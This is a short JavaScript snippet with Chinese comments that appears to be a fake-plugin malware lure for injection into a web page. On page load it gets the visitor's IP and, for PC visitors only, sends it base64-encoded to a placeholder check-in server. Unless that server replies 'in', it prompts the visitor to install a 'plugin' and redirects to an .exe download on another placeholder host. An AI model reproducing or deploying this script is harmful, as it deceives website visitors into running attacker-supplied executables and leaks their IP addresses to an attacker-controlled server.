document.write("<script src='http://pv.sohu.com/cityjson?ie=utf-8'></script>");


//上线检测
function isRise(ip) {
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlHttp.open("GET", "http://www.xxx.com/bobo.php?search="+ip, "true");
    xmlHttp.send();
    xmlHttp.onreadystatechange = function() {
		//alert(xmlHttp.responseText)
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var resData = xmlHttp.responseText;
            if (resData == "in") {
            } else {
                download();
            }
        }
    }
}

//下载
function download(){
    alert("请尝试下载并安装插件后访问本页面!");
    window.location.href="http://www.zzz.com/xxx.exe";
}

//判断是否是PC
function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
        return false;
    } else {
        return true;
    }
}

//load,ipbase64编码后,传递给后端
window.onload = function(){
    if(!isPc()){
        alert("当前页面只能在电脑PC端中加载,请稍后重试...");
    }else{
        isRise(btoa(returnCitySN["cip"]));
    }
}
